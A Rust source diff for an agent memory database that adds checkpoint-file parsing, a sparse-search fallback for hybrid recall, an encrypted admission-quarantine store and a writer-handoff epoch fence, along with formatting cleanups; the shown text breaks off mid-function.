@@ -589,6 +589,120 @@ fn rate_limited_log(site: &'static str, msg: &str) {
     }
 }
 
+/// #1028: a parsed checkpoint candidate (one vault-format .md file).
+struct CheckpointCandidate {
+    category: String,
+    key: String,
+    entity_type: String,
+    tags: Vec<String>,
+    decay: f64,
+    layer: String,
+    workspace: String,
+    agent_id: String,
+    body: String,
+    file: String,
+}
+
+/// #1028: parse vault-format checkpoint .md files (YAML frontmatter +
+/// markdown body) — the same wire shape `vault_export` / `vault_import` use.
+/// Files without frontmatter are skipped; malformed entries are surfaced by
+/// the caller as per-candidate errors.
+fn read_checkpoint_candidates(
+    dir: &str,
+) -> Result<Vec<CheckpointCandidate>, Box<dyn std::error::Error>> {
+    use std::fs;
+    use std::path::Path;
+    let vault = Path::new(dir);
+    if !vault.is_dir() {
+        return Err(format!("{dir} is not a directory").into());
+    }
+    let mut out = Vec::new();
+    for entry in fs::read_dir(vault)? {
+        let entry = entry?;
+        let path = entry.path();
+        if path.extension().is_none_or(|e| e != "md") {
+            continue;
+        }
+        let content = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+        let mut lines = content.lines().peekable();
+        while let Some(line) = lines.peek() {
+            if line.trim().is_empty() {
+                lines.next();
+            } else {
+                break;
+            }
+        }
+        match lines.next() {
+            Some(line) if line.trim() == "---" => {}
+            _ => continue, // files without frontmatter are not checkpoint entries
+        }
+        let mut fm_lines = Vec::new();
+        let mut found_close = false;
+        for line in lines.by_ref() {
+            if line.trim() == "---" {
+                found_close = true;
+                break;
+            }
+            fm_lines.push(line);
+        }
+        if !found_close {
+            continue;
+        }
+        let fm = fm_lines.join("\n");
+        let body: String = lines.collect::<Vec<_>>().join("\n").trim().to_string();
+        let get_fm = |key: &str| -> String {
+            fm.lines()
+                .find(|l| l.starts_with(&format!("{key}:")))
+                .and_then(|l| l.split_once(':').map(|x| x.1))
+                .unwrap_or("")
+                .trim()
+                .to_string()
+        };
+        let category = get_fm("category");
+        let key = get_fm("key");
+        let etype = get_fm("type");
+        let tags_str = get_fm("tags");
+        let decay: f64 = get_fm("decay_score").parse().unwrap_or(1.0);
+        let layer = get_fm("layer");
+        let workspace = get_fm("workspace_hash");
+        let agent_id = get_fm("agent_id");
+        let tags: Vec<String> = if tags_str.is_empty() || tags_str == "[]" {
+            vec![]
+        } else {
+            tags_str
+                .trim_matches(|c| c == '[' || c == ']')
+                .split(',')
+                .map(|s| s.trim().to_string())
+                .filter(|s| !s.is_empty())
+                .collect()
+        };
+        out.push(CheckpointCandidate {
+            category,
+            key,
+            entity_type: if etype.is_empty() {
+                "insight".to_string()
+            } else {
+                etype
+            },
+            tags,
+            decay,
+            layer: if layer.is_empty() {
+                "buffer".to_string()
+            } else {
+                layer
+            },
+            workspace,
+            agent_id,
+            body,
+            file: path
+                .file_name()
+                .map(|f| f.to_string_lossy().to_string())
+                .unwrap_or_default(),
+        });
+    }
+    Ok(out)
+}
+
 /// Capability required by the in-process administrative journal reader.
 ///
 /// The constructor is private to this module, so a public transport cannot
@@ -901,9 +1015,7 @@ impl Database {
     /// than guessed at. `canary_migrated` is 1 when the encryption canary
     /// itself still authenticated only under the pre-rebrand AAD and was
     /// rewritten onto the current AAD (#1018).
-    pub fn rekey_aad(
-        &self,
-    ) -> Result<(usize, usize, usize, usize), Box<dyn std::error::Error>> {
+    pub fn rekey_aad(&self) -> Result<(usize, usize, usize, usize), Box<dyn std::error::Error>> {
         let enc = match &self.encryption {
             Some(enc) => enc,
             None => return Ok((0, 0, 0, 0)),
@@ -1388,9 +1500,8 @@ impl Database {
     /// error (fail-closed) rather than a silent off.
     fn fingerprint_enabled_from_env() -> Result<bool, Box<dyn std::error::Error>> {
         match std::env::var("PERSEUS_VAULT_EMBEDDING_FINGERPRINT") {
-            Ok(v) => Ok(Self::parse_fingerprint_flag(&v).map_err(|e| {
-                format!("invalid PERSEUS_VAULT_EMBEDDING_FINGERPRINT '{v}': {e}")
-            })?),
+            Ok(v) => Ok(Self::parse_fingerprint_flag(&v)
+                .map_err(|e| format!("invalid PERSEUS_VAULT_EMBEDDING_FINGERPRINT '{v}': {e}"))?),
             Err(_) => Ok(false),
         }
     }
@@ -3971,7 +4082,10 @@ impl Database {
             .into_iter()
             .filter(|(entity, _)| visible_ids.contains(&entity.id))
             .map(|(entity, fp)| {
-                (entity, crate::fingerprint::fingerprint_similarity(&query_fp, &fp))
+                (
+                    entity,
+                    crate::fingerprint::fingerprint_similarity(&query_fp, &fp),
+                )
             })
             .collect();
         scored.sort_by(|left, right| {
@@ -4878,13 +4992,15 @@ impl Database {
         conn: &rusqlite::Connection,
     ) -> Result<std::collections::BTreeMap<String, i64>, Box<dyn std::error::Error>> {
         let mut policies = Self::default_decay_policies();
-        let mut stmt = conn.prepare(
-            "SELECT key, value_json FROM state WHERE key LIKE 'decay_policy.%'",
-        )?;
+        let mut stmt =
+            conn.prepare("SELECT key, value_json FROM state WHERE key LIKE 'decay_policy.%'")?;
         let rows = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))?;
         for row in rows {
             let (key, value) = row?;
-            let category = key.strip_prefix("decay_policy.").unwrap_or(&key).to_string();
+            let category = key
+                .strip_prefix("decay_policy.")
+                .unwrap_or(&key)
+                .to_string();
             let days = if value.trim_matches('"') == "never" {
                 i64::MAX / 86_400_000
             } else {
@@ -4987,20 +5103,45 @@ impl Database {
                 r.get::<_, Option<f64>>(5).unwrap_or(None).unwrap_or(0.0),
                 r.get::<_, f64>(6).unwrap_or(0.0),
                 r.get::<_, Option<i64>>(7).unwrap_or(None).unwrap_or(0),
-                r.get::<_, Option<String>>(8).unwrap_or(None).unwrap_or_default(),
+                r.get::<_, Option<String>>(8)
+                    .unwrap_or(None)
+                    .unwrap_or_default(),
                 // #1000: typed memory class — tolerant read for pre-v41 rows.
-                r.get::<_, Option<String>>(9).unwrap_or(None).unwrap_or_default(),
+                r.get::<_, Option<String>>(9)
+                    .unwrap_or(None)
+                    .unwrap_or_default(),
             ))
         })?;
 
         let mut updated = 0i64;
         let mut auto_archived = 0i64;
-        let mut batch: Vec<(String, i64, bool, String, f64, f64, f64, i64, String, String)> =
-            Vec::with_capacity(1000);
+        let mut batch: Vec<(
+            String,
+            i64,
+            bool,
+            String,
+            f64,
+            f64,
+            f64,
+            i64,
+            String,
+            String,
+        )> = Vec::with_capacity(1000);
         let now_val = now;
 
         // Helper: flush the current batch in a transaction.
-        let flush_batch = |batch: &mut Vec<(String, i64, bool, String, f64, f64, f64, i64, String, String)>,
+        let flush_batch = |batch: &mut Vec<(
+            String,
+            i64,
+            bool,
+            String,
+            f64,
+            f64,
+            f64,
+            i64,
+            String,
+            String,
+        )>,
                            updated: &mut i64,
                            auto_archived: &mut i64|
          -> Result<(), Box<dyn std::error::Error>> {
@@ -5035,7 +5176,8 @@ impl Database {
                     (((base_days as f64) * type_multiplier).max(1.0) as i64)
                 };
                 let half_life = days.saturating_mul(86_400_000);
-                let mut new_decay = Self::compute_decay_with_half_life(last_access, now_val, half_life);
+                let mut new_decay =
+                    Self::compute_decay_with_half_life(last_access, now_val, half_life);
                 // #298: verified/curated facts get a decay floor so the
                 // forgetting curve can never auto-archive them.
                 if verified {
@@ -6421,8 +6563,7 @@ impl Database {
             });
         }
         if let Some(most_restrictive) = restricted {
-            entity.visibility =
-                more_restrictive_visibility(&entity.visibility, &most_restrictive);
+            entity.visibility = more_restrictive_visibility(&entity.visibility, &most_restrictive);
         }
         Ok(entity)
     }
@@ -7023,7 +7164,14 @@ impl Database {
                         valid_from_unix_ms = ?4, valid_to_unix_ms = ?5,
                         embedding = NULL, emb_sig = NULL, emb_sig4 = NULL,
                         fingerprint = ?6 WHERE id = ?3",
-                    params![now, history_id, id, valid_from.unwrap_or(now), valid_to, fp_val],
+                    params![
+                        now,
+                        history_id,
+                        id,
+                        valid_from.unwrap_or(now),
+                        valid_to,
+                        fp_val
+                    ],
                 )?;
                 SIG_WRITE_GEN.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
             // #619
@@ -7459,13 +7607,20 @@ impl Database {
             return Ok((entities, completeness));
         }
         // Dense vector search path
+        // #1030: a hybrid query whose dense leg is unavailable (embedding tier
+        // off, no backend, no fingerprint tier) DEGRADES to the sparse arm
+        // with an explicit marker instead of failing the whole recall —
+        // integrations on lean binaries must still get keyword hits. Dense
+        // mode keeps its hard error (it has no sparse leg to fall back on;
+        // #226).
+        let mut hybrid_degraded: Option<String> = None;
         if params.mode == crate::models::SearchMode::Dense
             || params.mode == crate::models::SearchMode::Hybrid
         {
             // Use the caller-supplied query vector, or embed the query text. An
             // empty query has nothing to embed and falls through to FTS5; a
-            // non-empty query with no embedding backend surfaces a clear error
-            // rather than silently degrading to keyword search.
+            // non-empty DENSE query with no embedding backend surfaces a clear
+            // error rather than silently degrading to keyword search.
             let embedded;
             // #1020: when the embedding backend is unavailable AND the
             // deterministic fingerprint tier is enabled, dense/hybrid recall
@@ -7491,6 +7646,18 @@ impl Database {
                                 ),
                             );
                             fingerprint_fallback = true;
+                            None
+                        }
+                        Err(e) if params.mode == crate::models::SearchMode::Hybrid => {
+                            rate_limited_log(
+                                "hybrid-sparse-degrade",
+                                &format!(
+                                    "perseus-vault: dense leg unavailable for hybrid recall ({}); \
+                                     serving the sparse arm only",
+                                    e
+                                ),
+                            );
+                            hybrid_degraded = Some(e.to_string());
                             None
                         }
                         Err(e) => return Err(e),
@@ -7590,7 +7757,11 @@ impl Database {
                             let _ = crate::retrieval_telemetry::record_arm_audit(
                                 &*conn,
                                 "dense",
-                                if fingerprint_fallback { "fingerprint" } else { "dense" },
+                                if fingerprint_fallback {
+                                    "fingerprint"
+                                } else {
+                                    "dense"
+                                },
                                 dense_returned,
                                 0,
                                 out.len(),
@@ -7607,6 +7778,7 @@ impl Database {
                         crate::models::RecallCompleteness {
                             completeness,
                             scope: Some(scope),
+                            degraded: None,
                         },
                     ));
                 }
@@ -7912,7 +8084,11 @@ impl Database {
                         let _ = crate::retrieval_telemetry::record_arm_audit(
                             &*conn,
                             "hybrid",
-                            if fingerprint_fallback { "fingerprint" } else { "dense" },
+                            if fingerprint_fallback {
+                                "fingerprint"
+                            } else {
+                                "dense"
+                            },
                             d,
                             0,
                             d,
@@ -7957,6 +8133,7 @@ impl Database {
                     crate::models::RecallCompleteness {
                         completeness,
                         scope: Some(scope),
+                        degraded: None,
                     },
                 ));
             }
@@ -8007,6 +8184,7 @@ impl Database {
             crate::models::RecallCompleteness {
                 completeness: crate::models::Completeness::Exact,
                 scope: None,
+                degraded: hybrid_degraded,
             },
         ))
     }
@@ -8632,11 +8810,14 @@ impl Database {
                 declared_scored.iter().map(|(e, _)| e.id.clone()).collect();
             // Keep a live id list for the consensus-sources trace (the
             // scored vec itself is moved into the pinned order).
-            declared_ids_for_sources =
-                declared_scored.iter().map(|(e, _)| e.id.clone()).collect();
+            declared_ids_for_sources = declared_scored.iter().map(|(e, _)| e.id.clone()).collect();
             let pinned_len = declared_scored.len();
             let mut pinned: Vec<(Entity, f64)> = declared_scored;
-            pinned.extend(ranked.into_iter().filter(|(e, _)| !declared_ids.contains(&e.id)));
+            pinned.extend(
+                ranked
+                    .into_iter()
+                    .filter(|(e, _)| !declared_ids.contains(&e.id)),
+            );
             for (e, _) in pinned.iter().take(pinned_len) {
                 trace
                     .sources
@@ -8699,26 +8880,30 @@ impl Database {
             ordered = ents
                 .into_iter()
                 .map(|e| {
-                    let s = ordered.iter().find(|(c, _)| c.id == e.id).map(|(_, s)| *s).unwrap_or(0.0);
+                    let s = ordered
+                        .iter()
+                        .find(|(c, _)| c.id == e.id)
+                        .map(|(_, s)| *s)
+                        .unwrap_or(0.0);
                     (e, s)
                 })
                 .collect();
         }
         if params.multihop {
             let query_ents = crate::multihop::query_entities(&params.query);
-            let (ents, mut mh_trace) = crate::multihop::coverage_select(
-                &ordered,
-                &query_ents,
-                limit,
-                budget_tokens,
-            );
+            let (ents, mut mh_trace) =
+                crate::multihop::coverage_select(&ordered, &query_ents, limit, budget_tokens);
             mh_trace.hop_expanded = hop_expanded;
             mh_trace.expanded_ids = expanded_ids;
             trace.multihop = Some(mh_trace);
             ordered = ents
                 .into_iter()
                 .map(|e| {
-                    let s = ordered.iter().find(|(c, _)| c.id == e.id).map(|(_, s)| *s).unwrap_or(0.0);
+                    let s = ordered
+                        .iter()
+                        .find(|(c, _)| c.id == e.id)
+                        .map(|(_, s)| *s)
+                        .unwrap_or(0.0);
                     (e, s)
                 })
                 .collect();
@@ -8845,6 +9030,7 @@ impl Database {
             crate::models::RecallCompleteness {
                 completeness,
                 scope,
+                degraded: None,
             },
             trace,
         ))
@@ -10993,6 +11179,1193 @@ impl Database {
         Ok(format!("deleted quarantined write {id}"))
     }
 
+    // ── #1026 admission quarantine disposition ─────────────────────────────
+    // Sealed REJECTED candidates live outside the authoritative head: stored,
+    // attributed, linked to their attempt outcome + hash-only receipt, and
+    // reachable only through `perseus_vault_admission_quarantine`. Storage
+    // presence confers no authority — no read surface serves these rows.
+
+    /// Whether `proposal_id` was ever disposed as quarantined in the
+    /// workspace. Retired identifiers stay retired until their row is
+    /// purged — reuse is refused with a stable RetiredIdentifier error.
+    pub fn admission_quarantine_has_proposal(
+        &self,
+        workspace_hash: &str,
+        proposal_id: &str,
+    ) -> Result<bool, Box<dyn std::error::Error>> {
+        if proposal_id.is_empty() {
+            return Ok(false);
+        }
+        let conn = self.conn()?;
+        let hit: Option<String> = conn
+            .query_row(
+                "SELECT id FROM admission_quarantine WHERE workspace_hash = ?1 AND proposal_id = ?2",
+                params![workspace_hash, proposal_id],
+                |r| r.get(0),
+            )
+            .optional()?;
+        Ok(hit.is_some())
+    }
+
+    /// Seal a rejected candidate into `admission_quarantine` (body encrypted
+    /// like entities when encryption is on; AAD bound to category+key).
+    /// Returns the sealed record (id + receipt digest). Journaled
+    /// `admission_quarantined`.
+    #[allow(clippy::too_many_arguments)]
+    pub fn admission_quarantine_seal(
+        &self,
+        proposal_id: &str,
+        category: &str,
+        key: &str,
+        body_json: &str,
+        workspace_hash: &str,
+        agent_id: &str,
+        actor_kind: &str,
+        outcome: &str,
+        reason_codes: &[String],
+        record_digest: &str,
+        admission_decision_digest: &str,
+        decay_score: f64,
+    ) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+        let conn = self.conn()?;
+        if self.admission_quarantine_has_proposal(workspace_hash, proposal_id)? {
+            return Err(format!(
+                "RetiredIdentifier: proposal_identifier_retired — proposal '{proposal_id}' \
+                 was quarantined in this workspace; a new attempt identifier is required"
+            )
+            .into());
+        }
+        let qid = format!("qad-{}", uuid::Uuid::new_v4().simple());
+        let body_encrypted = if let Some(ref enc) = self.encryption {
+            let aad = Self::build_aad(category, key);
+            enc.encrypt(body_json, aad.as_bytes())
+                .map_err(|e| format!("Encryption error in admission quarantine: {e}"))?
+        } else {
+            body_json.to_string()
+        };
+        let now = now_ms();
+        let reason_codes_json = serde_json::to_string(reason_codes)?;
+        // Hash-only receipt: canonical digest over the sealed record's
+        // metadata (record/decision digests, never the raw payload).
+        let receipt_digest = {
+            let mut hasher = Sha256::new();
+            let material = format!(
+                "{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}",
+                qid,
+                proposal_id,
+                category,
+                key,
+                workspace_hash,
+                agent_id,
+                outcome,
+                reason_codes_json,
+                record_digest,
+                admission_decision_digest
+            );
+            hasher.update(material.as_bytes());
+            format!("{:x}", hasher.finalize())
+        };
+        conn.execute(
+            "INSERT INTO admission_quarantine
+             (id, proposal_id, category, key, body_json, status, workspace_hash,
+              agent_id, actor_kind, outcome, reason_codes, record_digest,
+              admission_decision_digest, receipt_digest, decay_score, created_at_unix_ms)
+             VALUES (?1,?2,?3,?4,?5,'active',?6,?7,?8,?9,?10,?11,?12,?13,?14,?15)",
+            params![
+                qid,
+                proposal_id,
+                category,
+                key,
+                body_encrypted,
+                workspace_hash,
+                agent_id,
+                actor_kind,
+                outcome,
+                reason_codes_json,
+                record_digest,
+                admission_decision_digest,
+                receipt_digest,
+                decay_score,
+                now,
+            ],
+        )?;
+        drop(conn);
+        self.journal(&JournalEvent {
+            id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
+            event_type: "admission_quarantined".to_string(),
+            evaluated_json: serde_json::to_string(&serde_json::json!({
+                "quarantine_id": qid,
+                "proposal_id": proposal_id,
+                "outcome": outcome,
+                "reason_codes": reason_codes,
+                "record_digest": record_digest,
+                "admission_decision_digest": admission_decision_digest,
+            }))?,
+            acted_json: serde_json::to_string(&serde_json::json!({
+                "stored": true,
+                "surface": "admission_quarantine",
+                "authoritative": false,
+            }))?,
+            forward_json: "{\"note\":\"sealed candidate retained outside the authoritative head; review via perseus_vault_admission_quarantine\"}".to_string(),
+            category: category.to_string(),
+            key: key.to_string(),
+            entity_id: qid.clone(),
+            agent_id: agent_id.to_string(),
+            workspace_hash: workspace_hash.to_string(),
+            created_at_unix_ms: now,
+        })?;
+        Ok(serde_json::json!({
+            "id": qid,
+            "receipt_digest": receipt_digest,
+            "status": "active",
+        }))
+    }
+
+    /// List quarantined admission candidates (no bodies — review list; use
+    /// `show` for the full sealed record). Scoped like other review
+    /// surfaces: empty workspace filter matches everything. Only ACTIVE
+    /// rows are listed by default.
+    pub fn admission_quarantine_list(
+        &self,
+        workspace_hash: Option<&str>,
+        include_retired: bool,
+        limit: i64,
+    ) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+        let conn = self.conn()?;
+        let status_clause = if include_retired {
+            "1=1"
+        } else {
+            "status = 'active'"
+        };
+        let sql = format!(
+            "SELECT id, proposal_id, category, key, workspace_hash, agent_id,
+                    outcome, reason_codes, receipt_digest, decay_score,
+                    status, created_at_unix_ms
+             FROM admission_quarantine
+             WHERE (?1 = '' OR workspace_hash = ?1) AND {status_clause}
+             ORDER BY created_at_unix_ms DESC
+             LIMIT ?2"
+        );
+        let mut stmt = conn.prepare(&sql)?;
+        let rows = stmt.query_map(
+            rusqlite::params![workspace_hash.unwrap_or(""), limit.clamp(1, 10_000)],
+            |r| {
+                Ok(serde_json::json!({
+                    "id": r.get::<_, String>(0)?,
+                    "proposal_id": r.get::<_, String>(1)?,
+                    "category": r.get::<_, String>(2)?,
+                    "key": r.get::<_, String>(3)?,
+                    "workspace_hash": r.get::<_, String>(4)?,
+                    "agent_id": r.get::<_, String>(5)?,
+                    "outcome": r.get::<_, String>(6)?,
+                    "reason_codes": r.get::<_, String>(7)?,
+                    "receipt_digest": r.get::<_, String>(8)?,
+                    "decay_score": r.get::<_, f64>(9)?,
+                    "status": r.get::<_, String>(10)?,
+                    "created_at_unix_ms": r.get::<_, i64>(11)?,
+                }))
+            },
+        )?;
+        Ok(rows.collect::<Result<Vec<_>, _>>()?)
+    }
+
+    /// Full record of one quarantined candidate, including the (decrypted)
+    /// sealed body and the admission attempt linkage. `None` when the id is
+    /// unknown.
+    pub fn admission_quarantine_show(
+        &self,
+        id: &str,
+    ) -> Result<Option<serde_json::Value>, Box<dyn std::error::Error>> {
+        let conn = self.conn()?;
+        let row = conn
+            .query_row(
+                "SELECT id, proposal_id, category, key, body_json, status,
+                        workspace_hash, agent_id, actor_kind, outcome,
+                        reason_codes, record_digest, admission_decision_digest,
+                        receipt_digest, decay_score, created_at_unix_ms
+                 FROM admission_quarantine WHERE id = ?1",
+                params![id],
+                |r| {
+                    Ok((
+                        r.get::<_, String>(0)?,
+                        r.get::<_, String>(1)?,
+                        r.get::<_, String>(2)?,
+                        r.get::<_, String>(3)?,
+                        r.get::<_, String>(4)?,
+                        r.get::<_, String>(5)?,
+                        r.get::<_, String>(6)?,
+                        r.get::<_, String>(7)?,
+                        r.get::<_, String>(8)?,
+                        r.get::<_, String>(9)?,
+                        r.get::<_, String>(10)?,
+                        r.get::<_, String>(11)?,
+                        r.get::<_, String>(12)?,
+                        r.get::<_, String>(13)?,
+                        r.get::<_, f64>(14)?,
+                        r.get::<_, i64>(15)?,
+                    ))
+                },
+            )
+            .optional()?;
+        let Some(row) = row else {
+            return Ok(None);
+        };
+        let (
+            qid,
+            proposal_id,
+            category,
+            key,
+            body_encrypted,
+            status,
+            workspace_hash,
+            agent_id,
+            actor_kind,
+            outcome,
+            reason_codes,
+            record_digest,
+            decision_digest,
+            receipt_digest,
+            decay_score,
+            created_at,
+        ) = row;
+        let body_plain = if let Some(ref enc) = self.encryption {
+            match Self::decrypt_body_with_aad_fallback(enc, &body_encrypted, &category, &key) {
+                crate::encryption::BodyDecrypt::Plaintext(s)
+                | crate::encryption::BodyDecrypt::LegacyPlaintext(s) => s,
+                crate::encryption::BodyDecrypt::AuthFailed(_) => {
+                    return Err(
+                        "admission_quarantine_show: stored body failed authentication".into(),
+                    )
+                }
+            }
+        } else {
+            body_encrypted
+        };
+        Ok(Some(serde_json::json!({
+            "id": qid,
+            "proposal_id": proposal_id,
+            "category": category,
+            "key": key,
+            "body_json": body_plain,
+            "status": status,
+            "workspace_hash": workspace_hash,
+            "agent_id": agent_id,
+            "actor_kind": actor_kind,
+            "outcome": outcome,
+            "reason_codes": reason_codes,
+            "record_digest": record_digest,
+            "admission_decision_digest": decision_digest,
+            "receipt_digest": receipt_digest,
+            "decay_score": decay_score,
+            "created_at_unix_ms": created_at,
+        })))
+    }
+
+    /// Retire one quarantined candidate (active → retired). The row is
+    /// RETAINED so its proposal identifier stays retired until purged.
+    /// Journaled `admission_quarantine_retired`.
+    pub fn admission_quarantine_retire(
+        &self,
+        id: &str,
+        actor: &str,
+    ) -> Result<String, Box<dyn std::error::Error>> {
+        let conn = self.conn()?;
+        let rec: Option<(String, String, String, String)> = conn
+            .query_row(
+                "SELECT category, key, workspace_hash, proposal_id
+                 FROM admission_quarantine WHERE id = ?1",
+                params![id],
+                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)),
+            )
+            .optional()?;
+        let Some((category, key, workspace_hash, proposal_id)) = rec else {
+            return Err(format!("no quarantined candidate with id {id}").into());
+        };
+        let changed = conn.execute(
+            "UPDATE admission_quarantine SET status = 'retired' WHERE id = ?1 AND status = 'active'",
+            params![id],
+        )?;
+        drop(conn);
+        self.journal(&JournalEvent {
+            id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
+            event_type: "admission_quarantine_retired".to_string(),
+            evaluated_json: serde_json::to_string(&serde_json::json!({
+                "quarantine_id": id,
+                "proposal_id": proposal_id,
+                "retired_by": actor,
+            }))?,
+            acted_json:
+                "{\"stored\":true,\"surface\":\"admission_quarantine\",\"status\":\"retired\"}"
+                    .to_string(),
+            forward_json:
+                "{\"note\":\"proposal identifier stays retired until the row is purged\"}"
+                    .to_string(),
+            category: category.clone(),
+            key: key.clone(),
+            entity_id: id.to_string(),
+            agent_id: actor.to_string(),
+            workspace_hash: workspace_hash.clone(),
+            created_at_unix_ms: now_ms(),
+        })?;
+        if changed == 0 {
+            Ok(format!("candidate {id} was already retired"))
+        } else {
+            Ok(format!("retired quarantined candidate {id}"))
+        }
+    }
+
+    /// Purge quarantined candidates: retired rows (decided) and/or active
+    /// rows older than the watermark, following the same reclamation
+    /// discipline as other attempt records. Returns the purged count.
+    /// Journaled `admission_quarantine_purged`.
+    pub fn admission_quarantine_purge(
+        &self,
+        actor: &str,
+        max_age_days: Option<i64>,
+        purge_retired: bool,
+    ) -> Result<usize, Box<dyn std::error::Error>> {
+        let conn = self.conn()?;
+        let watermark = now_ms() - max_age_days.unwrap_or(30).clamp(1, 3650) * 86_400_000;
+        let changed = conn.execute(
+            "DELETE FROM admission_quarantine
+             WHERE (?1 = 1 AND status = 'retired')
+                OR (status = 'active' AND created_at_unix_ms < ?2)",
+            params![purge_retired, watermark],
+        )?;
+        drop(conn);
+        self.journal(&JournalEvent {
+            id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
+            event_type: "admission_quarantine_purged".to_string(),
+            evaluated_json: serde_json::to_string(&serde_json::json!({
+                "purged": changed,
+                "purged_by": actor,
+                "purge_retired": purge_retired,
+                "max_age_days": max_age_days.unwrap_or(30),
+            }))?,
+            acted_json: "{\"stored\":false,\"surface\":\"none\"}".to_string(),
+            forward_json: "{\"note\":\"quarantined candidates reclaimed; purged proposal identifiers are reusable\"}".to_string(),
+            category: "admission_quarantine".to_string(),
+            key: "purge".to_string(),
+            entity_id: String::new(),
+            agent_id: actor.to_string(),
+            workspace_hash: String::new(),
+            created_at_unix_ms: now_ms(),
+        })?;
+        Ok(changed)
+    }
+
+    // ── #1027 epoch-fenced writer handoff ──────────────────────────────────
+    // Per-workspace single-writer directory. The Fence step CLEARS the writer
+    // and advances the epoch, so the Fence→Activate gap leaves ZERO active
+    // writers (fail-closed, never two). Every write against a directory row
+    // must present the current epoch; a stale writer's in-flight write fails
+    // with a stable StaleRevision / WriterEpoch reason instead of landing
+    // after authority moved.
+
+    /// Read the writer directory row for a workspace (`None` = unfenced).
+    pub fn writer_directory_get(
+        &self,
+        workspace_hash: &str,
+    ) -> Result<Option<serde_json::Value>, Box<dyn std::error::Error>> {
+        if workspace_hash.is_empty() {
+            return Ok(None);
+        }
+        let conn = self.conn()?;
+        let row = conn
+            .query_row(
+                "SELECT epoch, pointer_state, writer_agent_id, target_agent_id,
+                        lifecycle_json, updated_at_unix_ms
+                 FROM writer_directory WHERE workspace_hash = ?1",
+                params![workspace_hash],
+                |r| {
+                    Ok((
+                        r.get::<_, i64>(0)?,
+                        r.get::<_, String>(1)?,
+                        r.get::<_, String>(2)?,
+                        r.get::<_, String>(3)?,
+                        r.get::<_, String>(4)?,
+                        r.get::<_, i64>(5)?,
+                    ))
+                },
+            )
+            .optional()?;
+        Ok(
+            row.map(|(epoch, state, writer, target, lifecycle, updated)| {
+                serde_json::json!({
+                    "workspace_hash": workspace_hash,
+                    "epoch": epoch,
+                    "pointer_state": state,
+                    "writer_agent_id": writer,
+                    "target_agent_id": target,
+                    "lifecycle": serde_json::from_str::<serde_json::Value>(&lifecycle)
+                        .unwrap_or(serde_json::Value::Array(vec![])),
+                    "updated_at_unix_ms": updated,
+                })
+            }),
+        )
+    }
+
+    /// #1027: enforce the epoch-fenced writer directory for a write against
+    /// `workspace_hash`. Ok(()) when the write may proceed (absent directory,
+    /// unfenced, or prepared — the source may still advance), otherwise a
+    /// stable WriterUnavailable / WriterEpoch / StaleRevision error.
+    pub fn writer_directory_enforce(
+        &self,
+        workspace_hash: &str,
+        agent_id: &str,
+        writer_epoch: Option<i64>,
+    ) -> Result<(), String> {
+        let Some(dir) = self
+            .writer_directory_get(workspace_hash)
+            .map_err(|e| format!("writer directory lookup failed: {e}"))?
+        else {
+            return Ok(());
+        };
+        let state = dir["pointer_state"].as_str().unwrap_or("");
+        let epoch = dir["epoch"].as_i64().unwrap_or(0);
+        let writer = dir["writer_agent_id"].as_str().unwrap_or("");
+        match state {
+            // Prepare opens the handoff pointer; the source may still
+            // advance until Fence.
+            "" | "prepared" => Ok(()),
+            "active" => {
+                if writer.is_empty() {
+                    return Err(format!(
+                        "WriterUnavailable: workspace '{workspace_hash}' is fenced with no \
+                         active writer (epoch {epoch}); activate via perseus_vault_writer_handoff"
+                    ));
+                }
+                if !agent_id.is_empty() && agent_id != writer {
+                    return Err(format!(
+                        "WriterEpoch: writer '{writer}' holds the active write lease for \
+                         workspace '{workspace_hash}' (epoch {epoch})"
+                    ));
+                }
+                match writer_epoch {
+                    Some(e) if e == epoch => Ok(()),
+                    Some(e) => Err(format!(
+                        "StaleRevision: writer_epoch {e} is stale for workspace \
+                         '{workspace_hash}'; current epoch is {epoch}"
+                    )),
+                    None => Err(format!(
+                        "WriterEpoch: writer handoff is active in workspace \
+                         '{workspace_hash}'; pass writer_epoch={epoch} with the write"
+                    )),
+                }
+            }
+            other => Err(format!(
+                "WriterUnavailable: workspace '{workspace_hash}' is in handoff state \
+                 '{other}' (epoch {epoch}); no writer is authorized until \
+                 perseus_vault_writer_handoff activate"
+            )),
+        }
+    }
+
+    /// #1027: advance the writer-handoff state machine. Directory-serialized:
+    /// each action validates the current pointer state and appends a signed
+    /// lifecycle result (canonical receipt digest). Actions: prepare (open
+    /// the pointer; source may still advance), abort (clear the pointer),
+    /// fence (clear the writer + advance the epoch — zero writers until
+    /// activate), retarget (advance the target + epoch; the abandoned target
+    /// can no longer activate), activate (admission against the exact fenced
+    /// revision; the target becomes the active writer).
+    pub fn writer_handoff(
+        &self,
+        workspace_hash: &str,
+        action: &str,
+        actor: &str,
+        target: &str,
+        presented_epoch: Option<i64>,
+    ) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+        if workspace_hash.is_empty() {
+            return Err("writer_handoff requires a non-empty workspace_hash".into());
+        }
+        let conn = self.conn()?;
+        let row: Option<(i64, String, String, String, String)> = conn
+            .query_row(
+                "SELECT epoch, pointer_state, writer_agent_id, target_agent_id, lifecycle_json
+                 FROM writer_directory WHERE workspace_hash = ?1",
+                params![workspace_hash],
+                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)),
+            )
+            .optional()?;
+        let (mut epoch, mut state, mut writer, mut target_state) = row
+            .as_ref()
+            .map(|r| (r.0, r.1.clone(), r.2.clone(), r.3.clone()))
+            .unwrap_or((0, String::new(), String::new(), String::new()));
+        let mut lifecycle: Vec<serde_json::Value> = row
+            .as_ref()
+            .map(|r| {
+                serde_json::from_str::<serde_json::Value>(&r.4)
+                    .unwrap_or(serde_json::Value::Array(vec![]))
+                    .as_array()
+                    .cloned()
+                    .unwrap_or_default()
+            })
+            .unwrap_or_default();
+        let epoch_before = epoch;
+
+        // Signed lifecycle result: canonical receipt over the directory
+        // event (hash-only; never carries payloads or secrets).
+        let append_result = |lifecycle: &mut Vec<serde_json::Value>,
+                             action: &str,
